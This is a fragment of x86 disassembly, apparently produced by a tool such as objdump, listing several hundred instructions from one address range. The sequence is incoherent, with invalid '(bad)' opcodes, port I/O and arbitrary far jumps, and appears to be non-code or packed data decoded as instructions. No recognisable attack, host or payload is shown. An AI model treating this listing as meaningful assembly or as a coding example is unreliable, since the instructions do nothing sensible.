  417546:	or     al,0x9c
  417548:	aam    0x9b
  41754a:	rcl    DWORD PTR [ecx+0x290c5759],0xc1
  417551:	shl    BYTE PTR [eax+0x3c],1
  417554:	stos   BYTE PTR es:[edi],al
  417555:	ret    0xc389
  417558:	mov    bh,0x57
  41755a:	ja     0x41758b
  41755c:	gs xchg edi,eax
  41755e:	dec    eax
  41755f:	js     0x41756a
  417561:	mov    eax,0xae1af054
  417566:	and    eax,0xeac706b5
  41756b:	sar    BYTE PTR [ecx],cl
  41756d:	pop    edx
  41756e:	jne    0x417535
  417570:	push   ss
  417571:	add    al,0xfc
  417573:	addr16 out 0x47,al
  417576:	not    DWORD PTR [ebp-0x3d]
  417579:	jb     0x4175a6
  41757b:	xor    DWORD PTR [edi],0x40
  41757e:	add    al,0x23
  417580:	xchg   ebp,eax
  417581:	xchg   esp,eax
  417582:	inc    ebx
  417583:	mov    ebp,0xab9b05f8
  417588:	sub    DWORD PTR [edx-0x31],0x56
  41758c:	jmp    0x57e5:0x3b301f89
  417593:	sub    bl,dh
  417595:	sbb    eax,0xf03b8fe9
  41759a:	push   ebp
  41759b:	inc    ebp
  41759c:	dec    ebp
  41759d:	cmp    dl,BYTE PTR [edx+0x4d98c3ca]
  4175a3:	dec    ebx
  4175a4:	or     DWORD PTR [esi+0xa],edx
  4175a7:	pusha  
  4175a8:	jns    0x41756b
  4175aa:	mov    esp,0x70b3bdeb
  4175af:	mov    al,0x4e
  4175b1:	add    BYTE PTR [ecx+0x3ee88b57],ch
  4175b7:	mov    edx,eax
  4175b9:	adc    al,0x80
  4175bb:	not    ebp
  4175bd:	mov    ecx,0xdcfc890
  4175c2:	jge    0x4175d9
  4175c4:	fadd   QWORD PTR [eax]
  4175c6:	mov    BYTE PTR [esi],cl
  4175c8:	in     eax,dx
  4175c9:	dec    esi
  4175ca:	xchg   ch,al
  4175cc:	in     al,dx
  4175cd:	push   esp
  4175ce:	cld    
  4175cf:	add    al,0x82
  4175d1:	pop    ecx
  4175d2:	pop    esp
  4175d3:	xchg   ecx,eax
  4175d4:	xchg   edi,eax
  4175d5:	mov    ds:0x62d8f73,eax
  4175da:	and    al,0x8e
  4175dc:	jno    0x417568
  4175de:	shl    DWORD PTR [edx+0x74498504],1
  4175e4:	retf   
  4175e5:	in     al,dx
  4175e6:	mov    dh,0x1e
  4175e8:	push   esp
  4175e9:	cmp    al,0xb5
  4175eb:	mov    ah,0x3a
  4175ed:	sbb    eax,DWORD PTR [edx]
  4175ef:	sbb    al,0xc8
  4175f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175f2:	cmp    DWORD PTR [ecx],ebx
  4175f4:	jno    0x417607
  4175f6:	shl    DWORD PTR [esi-0x61],0x72
  4175fa:	or     BYTE PTR [ecx],dh
  4175fc:	xchg   esp,eax
  4175fd:	jns    0x4175a1
  4175ff:	(bad)  
  417601:	adc    ah,bl
  417603:	add    ecx,esi
  417605:	xor    BYTE PTR [edx+0x43b7be9],al
  41760b:	scas   al,BYTE PTR es:[edi]
  41760c:	rcl    BYTE PTR [edx+0xf],1
  41760f:	and    cl,BYTE PTR [eax]
  417611:	adc    ebx,DWORD PTR [eax-0x2e]
  417614:	ficom  DWORD PTR [esp+esi*8+0x7d084a09]
  41761b:	rol    BYTE PTR [esi],1
  41761d:	stc    
  41761e:	sbb    DWORD PTR [edi-0x205e56da],ebp
  417624:	mov    fs,WORD PTR [edx+ebx*4-0x22]
  417628:	ja     0x417614
  41762a:	dec    ecx
  41762b:	inc    eax
  41762c:	or     ebx,DWORD PTR [ecx+0x37200c8f]
  417632:	icebp  
  417633:	adc    eax,0x4af63c1c
  417638:	dec    ecx
  417639:	inc    edi
  41763a:	inc    esp
  41763b:	into   
  41763c:	mov    bl,0x5b
  41763e:	outs   dx,BYTE PTR ds:[esi]
  41763f:	inc    eax
  417640:	jmp    0xcd691a09
  417645:	fdivr  QWORD PTR [edi+0x7d184ec1]
  41764b:	jmp    0x6033:0x314b45a7
  417652:	mov    gs,WORD PTR [edi-0x14]
  417655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417656:	aam    0xe9
  417658:	pop    ecx
  417659:	icebp  
  41765a:	adc    eax,0x1027bd05
  41765f:	shl    BYTE PTR gs:[ebx-0x3a29c27f],0x63
  417667:	push   ebp
  417668:	popa   
  417669:	jbe    0x41766d
  41766b:	and    al,0x67
  41766d:	xchg   ebp,eax
  41766e:	pop    esp
  41766f:	hlt    
  417670:	(bad)  
  417673:	adc    BYTE PTR [ebp-0x502c351e],dh
  417679:	bound  edi,QWORD PTR [esi+edi*1]
  41767c:	out    dx,al
  41767d:	mov    eax,ds:0xdae64f30
  417682:	into   
  417683:	jmp    0x4176dc
  417685:	xchg   esp,eax
  417686:	pop    eax
  417687:	mov    al,0x9f
  417689:	xchg   edi,eax
  41768a:	xor    edi,DWORD PTR ds:0xa7debb2d
  417690:	aad    0x76
  417692:	sti    
  417693:	in     eax,dx
  417694:	sti    
  417695:	push   esi
  417696:	mov    BYTE PTR [edi-0x53],dh
  417699:	cli    
  41769a:	or     ecx,DWORD PTR [edx+esi*1]
  41769d:	shl    BYTE PTR [eax],cl
  41769f:	and    dl,ah
  4176a1:	not    BYTE PTR [ecx-0x14634e7b]
  4176a7:	push   edx
  4176a8:	jmp    0xe65a:0x8f8db606
  4176af:	aad    0x7d
  4176b1:	adc    al,0xa0
  4176b3:	mov    bl,ah
  4176b5:	xor    BYTE PTR [ebp+0x38bb32f2],bl
  4176bb:	cmp    ecx,esp
  4176bd:	in     al,0x6c
  4176bf:	xchg   ebx,eax
  4176c0:	mov    dh,0xc6
  4176c2:	adc    eax,0xa094eac2
  4176c7:	jg     0x417667
  4176c9:	es push 0xffffffc7
  4176cc:	xor    eax,0xe9fc4ebc
  4176d1:	int3   
  4176d2:	dec    edi
  4176d3:	push   0x6c09ee3f
  4176d8:	xchg   esp,eax
  4176d9:	sahf   
  4176da:	es jmp 0xda34:0x6f3cb69c
  4176e2:	push   ebx
  4176e3:	sub    DWORD PTR [eax-0x6b],0x9
  4176e7:	cmp    al,0x9c
  4176e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176ea:	dec    ecx
  4176eb:	pop    eax
  4176ec:	std    
  4176ed:	ror    DWORD PTR [eax+esi*2-0x1ecf0a0d],1
  4176f4:	xlat   BYTE PTR ds:[ebx]
  4176f5:	dec    esi
  4176f6:	xchg   esp,eax
  4176f7:	xor    eax,0xa029276a
  4176fc:	push   ecx
  4176fd:	add    DWORD PTR [edx+ebp*2],edx
  417700:	outs   dx,BYTE PTR ds:[esi]
  417701:	pop    ebx
  417702:	das    
  417703:	mov    bl,0xaf
  417705:	mov    al,ds:0xed57ba96
  41770a:	jo     0x4176f6
  41770c:	adc    eax,0x14f62926
  417711:	in     al,dx
  417712:	push   DWORD PTR [edi-0x6f]
  417715:	lods   al,BYTE PTR ds:[esi]
  417716:	stos   BYTE PTR es:[edi],al
  417717:	cmp    BYTE PTR [esi-0x4e6aeaa7],0xfd
  41771e:	aaa    
  41771f:	jb     0x417746
  417721:	or     al,0x27
  417723:	mov    ch,0x93
  417725:	loop   0x4176bb
  417727:	push   0x43
  417729:	cmp    dh,BYTE PTR [ebp-0x29403f2d]
  41772f:	mov    ah,0xbf
  417731:	cmp    al,0xbe
  417733:	dec    DWORD PTR [edi-0x7b]
  417736:	pop    edi
  417737:	aas    
  417738:	mov    ds:0xf3768395,al
  41773d:	and    eax,0xf57ebc7
  417742:	push   ds
  417743:	aam    0xb2
  417745:	pop    ss
  417746:	push   esi
  417747:	loop   0x4176d6
  417749:	cwde   
  41774a:	pop    edi
  41774b:	and    BYTE PTR [eax+0x66],bh
  41774e:	in     eax,dx
  41774f:	dec    esi
  417750:	or     BYTE PTR [edi+0x7b2120a],0x96
  417757:	pop    edx
  417758:	push   0x7
  41775a:	sbb    bh,cl
  41775c:	ret    
  41775d:	icebp  
  41775e:	cli    
  41775f:	mov    cl,0xc0
  417761:	loop   0x4176ff
  417763:	iret   
  417764:	mov    dh,0x97
  417766:	fcomp  QWORD PTR [eax]
  417768:	xor    DWORD PTR [ebp+esi*1+0x2e3fad17],eax
  41776f:	cmp    DWORD PTR [ecx+0x60],edx
  417772:	sti    
  417773:	call   DWORD PTR [ebx+0x36cc0a05]
  417779:	mov    WORD PTR [edx-0x12],?
  41777c:	xchg   ebx,eax
  41777d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41777e:	ss fcmovb st,st(2)
  417781:	inc    ecx
  417782:	mov    esi,0x284bd5f6
  417787:	sbb    BYTE PTR [ecx-0x68],0x3b
  41778b:	cdq    
  41778c:	xchg   edi,eax
  41778d:	in     eax,0xce
  41778f:	mov    ah,0x47
  417791:	nop
  417792:	push   ebx
  417793:	pop    DWORD PTR [ebx-0x43]
  417796:	or     al,BYTE PTR [ebp+0x4b3e81ab]
  41779c:	pushf  
  41779d:	arpl   WORD PTR [ebp+0x702f8e9c],ax
  4177a3:	dec    ebp
  4177a4:	stos   DWORD PTR es:[edi],eax
  4177a5:	inc    ebx
  4177a6:	mov    eax,0x17101baa
  4177ab:	in     eax,dx
  4177ac:	adc    eax,edi
  4177ae:	mov    esi,0xb8fab5c
  4177b3:	jmp    0x4177cc
  4177b5:	test   al,0x1
  4177b7:	stc    
  4177b8:	test   dh,ch
  4177ba:	mov    eax,ds:0x9e75315c
  4177bf:	dec    edx
  4177c0:	xchg   BYTE PTR [ecx],bh
  4177c2:	fimul  WORD PTR [edx-0x5278e960]
  4177c8:	leave  
  4177c9:	out    0xa2,eax
  4177cb:	idiv   ebp
  4177cd:	mov    ah,0x6e
  4177cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177d0:	sbb    DWORD PTR [edx-0x70],ecx
  4177d3:	lds    ebx,FWORD PTR [esi-0x698049b2]
  4177d9:	push   ebx
  4177da:	int3   
  4177db:	test   eax,0x90ce479e
  4177e0:	pop    edx
  4177e1:	pop    es
  4177e2:	dec    edx
  4177e3:	mov    esi,0xd422150a
  4177e9:	push   esp
  4177ea:	outs   dx,DWORD PTR ds:[esi]
  4177eb:	or     eax,0xfba7a18a
  4177f0:	mov    edx,0xd681adb1
  4177f5:	xchg   esi,eax
  4177f6:	jae    0x41779a
  4177f8:	ror    al,cl
  4177fa:	or     ch,BYTE PTR [ebx-0x60]
  4177fd:	push   esi
  4177fe:	ror    BYTE PTR [esi-0x190a3234],cl
  417804:	cld    
  417805:	push   0xffffff8e
  417807:	add    DWORD PTR [edx+eax*8],esp
  41780a:	int    0xa6
  41780c:	pop    ebx
  41780d:	or     eax,0x87ad668d
  417812:	adc    cl,BYTE PTR [eax+0x5cb0f8ea]
  417818:	pop    ds
  417819:	xchg   cl,ch
  41781b:	daa    
  41781c:	(bad)  
  41781d:	xchg   edi,eax
  41781e:	cld    
  41781f:	xchg   ecx,eax
  417820:	xor    DWORD PTR ds:0xd28d45aa,ebp
  417826:	nop
  417827:	jmp    FWORD PTR [ebp-0x1ecdd742]
  41782d:	add    al,0x88
  41782f:	mov    ecx,0x71be27a0
  417834:	gs cdq 
  417836:	dec    ecx
  417837:	inc    esi
  417838:	sub    bh,BYTE PTR [ebx+ecx*1+0x1d077f2a]
  41783f:	iret   
  417840:	sbb    DWORD PTR fs:[eax+0x297f83ec],0xfffffffc
  417848:	imul   edx,DWORD PTR [edx+0x3a],0xecdf16ac
  41784f:	mov    ds:0xb64e1c60,al
  417854:	push   ecx
  417856:	dec    edi
  417857:	lods   al,BYTE PTR ds:[esi]
  417858:	call   0x8b6c663b
  41785d:	sbb    cl,bh
  41785f:	pop    es
  417860:	test   BYTE PTR [ebx],cl
  417862:	or     DWORD PTR [esi+0xbc7ea4a],esp
  417868:	in     al,dx
  417869:	dec    ecx
  41786a:	icebp  
  41786b:	call   0x44c2f1e1
  417870:	imul   ebp,edi,0xffffffbc
  417873:	or     esi,DWORD PTR [ebx]
  417875:	jnp    0x41786e
  417877:	lds    edi,FWORD PTR [esi]
  417879:	pop    esp
  41787a:	push   ebx
  41787b:	jle    0x4178fb
  41787d:	in     al,dx
  41787e:	lods   eax,DWORD PTR ds:[esi]
  41787f:	xor    al,0xcd
  417881:	push   ecx
  417882:	into   
  417883:	pop    esp
  417884:	fmul   QWORD PTR [eax+0x0]
  417887:	out    0x38,al
  417889:	mov    esp,0x52a6d052
  41788e:	xor    DWORD PTR [eax-0x60],0x7b
  417892:	sub    al,0x1e
  417894:	out    dx,al
  417895:	xor    esi,DWORD PTR [eax+0x64]
  417898:	ror    dl,cl
  41789a:	(bad)  
  41789c:	mov    edx,0x5bb246dd
  4178a1:	cmp    BYTE PTR [edi-0x4c54d8e7],ah
  4178a7:	out    0xe9,eax
  4178a9:	aas    
  4178aa:	nop
  4178ab:	adc    esp,ecx
  4178ad:	and    al,0x4a
  4178af:	sub    al,0xa3
  4178b1:	push   0x9dd3d774
  4178b6:	je     0x417852
  4178b8:	or     eax,0xf513a238
  4178bd:	enter  0xa6d2,0x9d
  4178c1:	addr16 loopne 0x417852
  4178c4:	neg    DWORD PTR [ecx]
  4178c6:	add    DWORD PTR [ebx],edx
  4178c8:	mov    dh,0x70
  4178ca:	adc    DWORD PTR [edi],esp
  4178cc:	lock xchg esi,eax
  4178ce:	jo     0x417898
  4178d0:	fbstp  TBYTE PTR [ecx]
  4178d2:	inc    ebp
  4178d3:	imul   esi
  4178d5:	data16 jb 0x417870
  4178d8:	add    BYTE PTR [eax+0x5f],0x2a
  4178dc:	scas   eax,DWORD PTR es:[edi]
  4178dd:	cmp    ebx,edi
  4178df:	enter  0xf667,0x38
  4178e3:	jmp    0xda593b22
  4178e8:	out    dx,al
  4178e9:	inc    ebp
  4178ea:	lds    eax,FWORD PTR ds:0x1cb0f7f3
  4178f0:	aad    0x12
  4178f2:	jno    0x417887
  4178f4:	sahf   
  4178f5:	mov    cl,0x99
  4178f7:	sbb    DWORD PTR [eax+0xa],eax
  4178fa:	or     al,0x8
  4178fc:	je     0x41793a
  4178fe:	pop    es
  4178ff:	ficom  WORD PTR [ecx]
  417901:	cmp    DWORD PTR [ebp+0x47],ebx
  417904:	fcomp  DWORD PTR [ebp-0x2e326bf1]
  41790a:	loop   0x417961
  41790c:	jbe    0x4178eb
  41790e:	or     eax,0xd7603c16
  417913:	les    ecx,FWORD PTR [ebx]
  417915:	clc    
  417916:	ror    DWORD PTR [edi],1
  417918:	mov    DWORD PTR [ebx-0x51a1ef73],eax
  41791e:	icebp  
  41791f:	mov    dh,0x1
  417921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417922:	pop    ecx
  417923:	lods   eax,DWORD PTR ds:[esi]
  417924:	sub    eax,DWORD PTR [edi+0x7354276]
  41792a:	in     al,dx
  41792b:	xchg   ecx,eax
  41792c:	aad    0x69
  41792e:	or     BYTE PTR ds:0x2c96c5be,bh
  417934:	btr    DWORD PTR [ecx],esi
  417937:	push   cs
  417938:	push   es
  417939:	mov    ds:0xeaedf4f0,al
  41793e:	mov    ecx,0x8139bc4d
  417943:	add    al,0x5d
  417945:	icebp  
  417946:	ret    
  417947:	xor    DWORD PTR [ebx-0x6f],0xffffffea
  41794b:	xor    esp,DWORD PTR [edx+edi*4+0x20]
  41794f:	sbb    eax,0xbe44f8e8
  417954:	xor    eax,0xe28d9a07
  417959:	sar    BYTE PTR [edx+0x3],cl
  41795c:	add    esi,DWORD PTR [edx+edi*4+0x47]
  417960:	xchg   esp,eax
  417961:	adc    DWORD PTR [edx-0x69830548],edi
  417967:	cwde   
  417968:	std    
  417969:	xchg   ecx,eax
  41796a:	sbb    BYTE PTR [ebp-0x76],al
  41796d:	popf   
  41796e:	adc    eax,0x9b063cd6
  417973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417974:	(bad)  
  417975:	adc    eax,0x79bfdc46
  41797a:	xchg   edx,eax
  41797b:	mov    dh,0x7a
  41797d:	sbb    eax,0x52325a8e
  417982:	cmp    edi,DWORD PTR [esi+0x18]
  417985:	pusha  
  417986:	out    0x6c,al
  417988:	mov    bl,0x7f
  41798a:	jo     0x41797c
  41798c:	ret    0xd2f5
  41798f:	js     0x417981
  417991:	add    ah,BYTE PTR ds:0x30aa1ec4
  417997:	cdq    
  417998:	adc    DWORD PTR [eax],esi
  41799a:	sti    
  41799b:	ffreep st(5)
  41799d:	test   eax,0xd3e3e421
  4179a2:	push   0xffffff94
  4179a4:	pop    ecx
  4179a5:	mov    ch,0xe0
  4179a7:	dec    esi
  4179a8:	aaa    
  4179a9:	inc    edi
  4179aa:	jmp    0xebfd7794
  4179af:	or     DWORD PTR [eax*4+0x1ffcfe1f],0xfffffffb
  4179b7:	out    dx,eax
  4179b8:	sub    esi,edx
  4179ba:	loop   0x41795f
  4179bc:	mov    cl,0x9a
  4179be:	mov    bh,0xf9
  4179c0:	pop    ss
  4179c1:	push   0xf0773cee
  4179c6:	push   cs
  4179c7:	inc    edx
  4179c8:	mov    ah,0xb7
  4179ca:	mov    esi,0x71cee777
  4179cf:	faddp  st(0),st
  4179d1:	cld    
  4179d2:	test   al,0xc2
  4179d4:	mov    al,BYTE PTR [ecx-0x64f8961c]
  4179da:	enter  0xdb37,0x93
  4179de:	nop
  4179df:	cli    
  4179e0:	sub    eax,0xb4db1159
  4179e5:	retf   0xf5ff
  4179e8:	(bad)  [edx+eax*1+0x4d949c5b]
  4179ef:	sar    BYTE PTR [ecx+0x1e],cl
  4179f2:	mov    WORD PTR [ebx],?
  4179f4:	gs daa 
  4179f6:	popa   
  4179f7:	repz jnp 0x4179eb
  4179fa:	cld    
  4179fb:	loope  0x4179bd
  4179fd:	icebp  
  4179fe:	sbb    DWORD PTR [esi+0x4c],ecx
  417a01:	call   0x4ff2:0xfd30095a
  417a08:	fsub   DWORD PTR [edx-0x2138b5fa]
  417a0e:	out    dx,al
  417a0f:	lds    edx,FWORD PTR [esi+0x376da9d3]
  417a15:	loope  0x417a89
  417a17:	adc    DWORD PTR [edi-0x2d0b683f],edx
  417a1d:	push   esp
  417a1e:	sub    al,0xe8
  417a20:	addr16 icebp 
  417a22:	pop    edi
  417a23:	sbb    BYTE PTR [esi-0xc5675fd],bh
  417a29:	cwde   
  417a2a:	dec    eax
  417a2b:	inc    ebp
  417a2c:	test   DWORD PTR [ecx-0x1c],eax
  417a2f:	adc    ah,BYTE PTR [eax]
  417a31:	xor    ebx,ebp
  417a33:	addr16 adc dh,ch
  417a36:	jno    0x417a8f
  417a38:	les    edi,FWORD PTR [eax+edx*8]
  417a3b:	mov    dh,0xec
  417a3d:	retf   
  417a3e:	dec    ecx
  417a3f:	inc    DWORD PTR [eax+0x20852de2]
  417a45:	lods   al,BYTE PTR ds:[esi]
  417a46:	pushf  
  417a47:	inc    ecx
  417a48:	pusha  
  417a49:	dec    ebx
  417a4a:	mov    esi,0xab7aff49
  417a50:	mov    cl,BYTE PTR [bx+di-0x2e29]
  417a55:	leave  
  417a56:	inc    ebx
  417a57:	ds xchg ecx,eax
  417a59:	push   cs
  417a5a:	(bad)  
  417a5b:	jmp    0x417a3f
  417a5d:	fbld   TBYTE PTR [ecx-0x4d]
  417a60:	sub    cl,cl
  417a62:	(bad)  
  417a63:	loope  0x417aa7
  417a65:	not    dh
  417a67:	stos   BYTE PTR es:[edi],al
  417a68:	push   eax
  417a69:	int3   
  417a6a:	sti    
  417a6b:	xor    al,BYTE PTR [ebp+0x40]
  417a6e:	push   edx
  417a6f:	inc    ebp
  417a70:	jge    0x417a0f
  417a72:	and    DWORD PTR [ecx-0x19],ebp
  417a75:	dec    edx
  417a76:	pop    eax
  417a77:	and    BYTE PTR [ebp+0x22],bl
  417a7a:	shr    DWORD PTR [edx-0x49],1
  417a7d:	addr16 mov esp,0xbe8a6ae0
  417a83:	dec    edi
  417a84:	dec    esi
  417a85:	sub    dl,BYTE PTR [ecx]
  417a87:	rcl    DWORD PTR ds:0xe1cd576c,cl
  417a8d:	out    dx,al
  417a8e:	aam    0x74
  417a90:	jo     0x417a31
  417a92:	cdq    
  417a93:	test   al,0x9e
  417a95:	fbld   TBYTE PTR [ebx+ebx*4+0x58f1b224]
  417a9c:	xchg   ch,dh
  417a9e:	mov    bh,0x4b
  417aa0:	jmp    0x417add
  417aa2:	test   eax,0xc9ed492e
  417aa7:	lahf   
  417aa8:	rol    ch,cl
  417aaa:	outs   dx,DWORD PTR ds:[esi]
  417aab:	(bad)  
  417aac:	iret   
  417aad:	push   ss
  417aae:	int3   
  417aaf:	cli    
  417ab0:	push   ebx
  417ab1:	sub    BYTE PTR [edi-0x602ddf9c],ah
  417ab7:	sub    DWORD PTR [ebp+esi*8-0x3c],edx
  417abb:	push   edx
  417abc:	loopne 0x417abc
  417abe:	rcl    DWORD PTR [ebp+ebp*1-0x48],cl
  417ac2:	mov    esi,0x717373fa
  417ac7:	cmp    ch,ah
  417ac9:	ficomp WORD PTR [eax+0x59]
  417acc:	push   cs
  417acd:	bound  ecx,QWORD PTR [eax+0x1f8c56da]
  417ad3:	loope  0x417a68
  417ad5:	and    DWORD PTR ds:0x91fa5048,0x4a
  417adc:	xor    edx,DWORD PTR [ecx+edx*2]
  417adf:	or     BYTE PTR [esi-0x45],al
  417ae2:	shr    BYTE PTR [ecx+0x6c3e3f1d],0x79
  417ae9:	shr    ebp,0xba
  417aec:	fnstsw WORD PTR [ecx-0x35]
  417aef:	push   ebp
  417af0:	push   0x47
  417af2:	mov    esp,0x623b5bcb
  417af7:	mov    eax,ds:0x79c5a511
  417afc:	into   
  417afd:	icebp  
  417afe:	into   
  417aff:	mov    cl,0x63
  417b01:	icebp  
  417b02:	ins    BYTE PTR es:[edi],dx
  417b03:	or     edi,eax
  417b05:	mov    dh,0x36
  417b07:	jae    0x417ab2
  417b09:	test   al,0x66
  417b0b:	sbb    BYTE PTR ds:0xe0bd2e4c,dh
  417b11:	mov    ch,0xd8
  417b13:	aam    0xb1
  417b15:	cld    
  417b16:	jg     0x417ade
  417b18:	pop    edx
  417b19:	sub    cl,BYTE PTR [ebx+0xd]
  417b1c:	dec    dx
  417b1e:	pop    ecx
  417b1f:	pop    ss
  417b20:	jge    0x417b96
  417b22:	inc    esi
  417b23:	sti    
  417b24:	sub    eax,0x7c6dd9ae
  417b29:	lea    ecx,[edx-0x27b6f6a3]
  417b2f:	push   ss
  417b30:	stc    
  417b31:	scas   eax,DWORD PTR es:[edi]
  417b32:	hlt    
  417b33:	xchg   ecx,eax
  417b34:	retf   0x80e7
  417b37:	aas    
  417b38:	xlat   BYTE PTR ds:[ebx]
  417b39:	lods   eax,DWORD PTR ds:[esi]
  417b3a:	mul    esi
  417b3c:	pusha  
  417b3d:	jl     0x417b21
  417b3f:	fidiv  DWORD PTR [ecx+eax*4]
  417b42:	sub    dl,BYTE PTR [eax+0x32]
  417b45:	lods   eax,DWORD PTR cs:[esi]
  417b47:	fnstenv ds:0x24d75b13
  417b4d:	pop    esi
  417b4e:	fiadd  WORD PTR [ecx]
  417b50:	push   eax
  417b51:	push   edi
  417b52:	gs mov ah,0xfd
  417b55:	ss push ds
  417b57:	dec    ecx
  417b58:	sub    dh,dl
  417b5a:	mov    ch,0x69
  417b5c:	inc    eax
  417b5d:	xchg   ebx,eax
  417b5e:	jno    0x417bce
  417b60:	mov    DWORD PTR ds:0xa692679c,ecx
  417b66:	jecxz  0x417b7b
  417b68:	jbe    0x417bc6
  417b6a:	ins    BYTE PTR es:[edi],dx
  417b6b:	loope  0x417afb
  417b6d:	mov    eax,0x1b6ad5fc
  417b72:	xadd   edx,edx
  417b75:	pop    es
  417b76:	in     eax,dx
  417b77:	pop    eax
  417b78:	retf   0xa342
  417b7b:	retf   
  417b7c:	arpl   WORD PTR [esi+0x3f],cx
  417b7f:	adc    al,0x63
  417b81:	xlat   BYTE PTR ds:[ebx]
  417b82:	pushf  
  417b83:	fiadd  WORD PTR [edi-0x36]
  417b86:	adc    eax,0x2d505c70
  417b8b:	mov    dl,0x24
  417b8d:	ja     0x417b11
  417b8f:	aam    0xd0
  417b91:	mov    ecx,edi
  417b93:	call   0xdefba3f2
  417b98:	enter  0x39c7,0xe0
  417b9c:	cmp    edi,DWORD PTR [ecx-0x1d]
  417b9f:	jge    0x417b48
  417ba1:	and    al,0x99
  417ba3:	call   0x3877:0xf5e1f3c3
  417baa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bab:	call   0xb29a:0xdcf1f58c
  417bb2:	dec    edi
  417bb3:	push   edx
  417bb4:	ins    DWORD PTR es:[edi],dx
  417bb5:	je     0x417ba5
  417bb7:	push   ss
  417bb8:	push   ds
  417bb9:	xchg   ebx,eax
  417bba:	add    eax,0x42afb55b
  417bbf:	and    DWORD PTR [ebp+0xd44f99f],0x24
  417bc6:	out    dx,al
  417bc7:	push   eax
  417bc8:	stos   BYTE PTR es:[edi],al
  417bc9:	and    esi,DWORD PTR [eax+0x75338140]
  417bcf:	test   eax,0x8dede528
  417bd4:	nop
  417bd5:	cli    
  417bd6:	mov    cl,0xf2
  417bd8:	lahf   
  417bd9:	pop    ecx
  417bda:	fs dec ebp
  417bdc:	and    esi,DWORD PTR fs:[ebx]
  417bdf:	out    0xd9,al
  417be1:	(bad)  
  417be2:	jb     0x417bca
  417be4:	nop
  417be5:	lods   al,BYTE PTR ds:[esi]
  417be6:	dec    ebp
  417be7:	adc    DWORD PTR [eax],ebx
  417be9:	mov    dl,0xbf
  417beb:	jmp    0xa272:0xa2f73920
  417bf2:	icebp  
  417bf3:	sub    eax,0xf0f63a1e
  417bf8:	inc    esi
  417bf9:	stos   BYTE PTR es:[edi],al
  417bfa:	adc    esi,DWORD PTR [esi-0x7d005869]
  417c00:	cmp    al,0xb5
  417c02:	jle    0x417c69
  417c04:	mov    edi,0x78f3965a
  417c09:	fiadd  WORD PTR [ebx-0x85bc743]
  417c0f:	sti    
  417c10:	sub    eax,0x5049a939
  417c15:	adc    al,0x60
  417c17:	cmc    
  417c18:	xchg   esi,eax
  417c19:	cmp    ch,dl
  417c1b:	add    al,0xbf
  417c1d:	sub    al,0x6f
  417c1f:	push   ss
  417c20:	or     BYTE PTR [eax],al
  417c22:	(bad)  
  417c23:	out    dx,eax
  417c24:	stos   WORD PTR es:[edi],ax
  417c26:	fimul  WORD PTR [edx]
  417c28:	subps  xmm0,xmm2
  417c2b:	jecxz  0x417bcd
  417c2d:	push   edi
  417c2e:	(bad)
  417c31:	lods   al,BYTE PTR ds:[esi]
  417c32:	xor    al,0xfa
  417c34:	cmp    edx,edx
  417c36:	arpl   WORD PTR [edi],bx
  417c38:	mov    WORD PTR [ebp-0x1a708c66],cs
  417c3e:	pop    esp
  417c3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c40:	pop    ds
  417c41:	(bad)  
  417c43:	adc    edx,DWORD PTR [edi+0x2c]
  417c46:	mov    edi,0xcc14128b
  417c4b:	mov    BYTE PTR [ebp+0xa],cl
  417c4e:	or     DWORD PTR [edi+0x51507198],eax
  417c54:	ss cld 
  417c56:	dec    edi
  417c57:	mov    edi,0x4820df96
  417c5c:	inc    ecx
  417c5d:	xor    dh,dh
  417c5f:	mov    esp,0xaf350dba
  417c64:	cmp    edi,ecx
  417c66:	ins    DWORD PTR es:[edi],dx
  417c67:	jno    0x417c27
  417c69:	lods   al,BYTE PTR ds:[esi]
  417c6a:	scas   eax,DWORD PTR es:[edi]
  417c6b:	jmp    0x7f125635
  417c70:	adc    eax,ebx
  417c72:	ret    0x2762
  417c75:	es xchg ebp,eax
  417c77:	push   esp
  417c78:	inc    ecx
  417c79:	cdq    
  417c7a:	cld    
  417c7b:	pushf  
  417c7c:	cs mov bh,0x82
  417c7f:	lahf   
  417c80:	imul   ecx,DWORD PTR [eax-0x21],0x4b
  417c84:	or     eax,0xa990852b
  417c89:	retf   
  417c8a:	pop    edi
  417c8b:	lea    eax,[esi-0xeae6bab]
  417c91:	fucomi st,st(5)
  417c93:	push   edx
  417c94:	sub    al,0xef
  417c96:	push   ebx
  417c97:	data16 out 0x97,al
  417c9a:	mov    cl,0xa7
  417c9c:	fnstcw WORD PTR [ecx-0x27]
  417c9f:	jp     0x417d1e
  417ca1:	adc    bh,BYTE PTR [eax-0x561cbea4]
  417ca7:	add    eax,0x148d1d8a
  417cac:	sbb    esp,0xffffffd9
  417caf:	sahf   
  417cb0:	nop
  417cb1:	(bad)  
  417cb3:	mov    ?,ebp
  417cb5:	sar    edi,1
  417cb7:	inc    eax
  417cb8:	fwait
  417cb9:	mov    ?,WORD PTR [eax+0x4f388ca8]
  417cbf:	xchg   DWORD PTR [ebp-0xf],ebx
  417cc2:	xchg   esi,eax
  417cc3:	dec    esp
  417cc4:	lock or esp,DWORD PTR [esi]
  417cc7:	cli    
  417cc8:	pusha  
  417cc9:	retf   
  417cca:	jb     0x417c98
  417ccc:	gs sbb eax,0xe378ffbc
  417cd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cd3:	add    al,0xe3
  417cd5:	mov    dh,0xc6
  417cd7:	les    ebp,FWORD PTR [ebp+0x50e3f37e]
  417cdd:	inc    esp
  417cde:	fld    TBYTE PTR [edx-0x6b]
  417ce1:	mov    edx,0xb749542a
  417ce6:	popf   
  417ce7:	repnz mov ds:0xa90cde95,eax
  417ced:	inc    esi
  417cee:	ins    BYTE PTR es:[edi],dx
  417cef:	pop    edx
  417cf0:	xor    al,0x11
  417cf2:	dec    ebp
  417cf3:	adc    bl,BYTE PTR [ecx]
  417cf5:	scas   al,BYTE PTR es:[edi]
  417cf6:	sub    al,0x20
  417cf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cf9:	int    0x9
  417cfb:	mov    al,ds:0x6440bf7f
